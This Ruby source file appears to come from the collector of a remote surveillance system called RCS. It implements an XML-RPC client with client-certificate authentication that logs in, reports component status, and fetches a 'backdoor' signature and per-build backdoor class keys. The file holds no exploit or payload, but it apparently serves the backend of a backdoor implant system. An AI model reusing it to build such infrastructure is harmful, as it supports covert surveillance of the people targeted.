#
#  DB layer for XML-RPC communication
#

# from RCS::Common
require 'rcs-common/trace'

# system
require 'xmlrpc/client'

module RCS
module Collector

class DB_xmlrpc
  include RCS::Tracer

  def initialize(host)
    @host, @port = host.split(':')

    # create the xml-rpc server
    @server = XMLRPC::Client.new(@host, "/server.php", @port, nil, nil, nil, nil, true)

    # we need to set an attribute inside the http instance variable of @server
    # we can get a reference here and manipulate it later
    http = @server.instance_variable_get(:@http)

    # no SSL verify for this connection
    #http.verify_mode = OpenSSL::SSL::VERIFY_NONE

    # CA certificate to check if the server ssl certificate is valid
    http.ca_file = Dir.pwd + "/config/rcs-client.pem"

    # our client certificate to send to the server
    http.cert = OpenSSL::X509::Certificate.new(File.read(Dir.pwd + "/config/rcs-client.pem")) 

    trace :debug, "Using XML-RPC to communicate with #{@host}:#{@port}"
  end

  # log in to the database
  # returns a boolean
  def login(user, pass)
    begin
      response = @server.call("auth.login", user, pass)
      return true
    rescue Exception => e
      trace :error, "Error calling auth.login: #{e.message}"

      # we can get a "method not found" error only if we are already logged in
      # in this case, we force a logout and retry the login
      if e.message['method not found'] then
        trace :debug, "forcing logout and retrying..."
        logout
        return login(user, pass)
      end
      
      return false
    end
  end

  def logout
    begin
      response = @server.call("auth.logout")
      trace :debug, "XML-RPC logout: #{response}"
      return true
    rescue Exception => e
      trace :error, "Error calling auth.logout: #{e.message}"
      return false
    end
  end

  def update_status(component, remoteip, status, message, disk, cpu, pcpu)
    begin
      @server.call("monitor.set", component, remoteip, status, message, disk, cpu, pcpu)
    rescue Exception => e
      trace :error, "Error calling monitor.set: #{e.message}"
    end
  end

  def backdoor_signature
    begin
      return @server.call("sign.get", "backdoor")
    rescue Exception => e
      trace :error, "Error calling sign.get: #{e.message}"
    end
  end

  def class_keys
    begin
      list = @server.call("backdoor.getclasskey", "")
      # convert the response into an hash indexed by 'build'
      class_keys = {}
      list.each do |elem|
        class_keys[elem["build"]] = elem["classkey"]
      end
      return class_keys
    rescue Exception => e
      trace :error, "Error calling backdoor.getclasskey: #{e.message}"
    end
  end

end #

end #Collector::
end #RCS::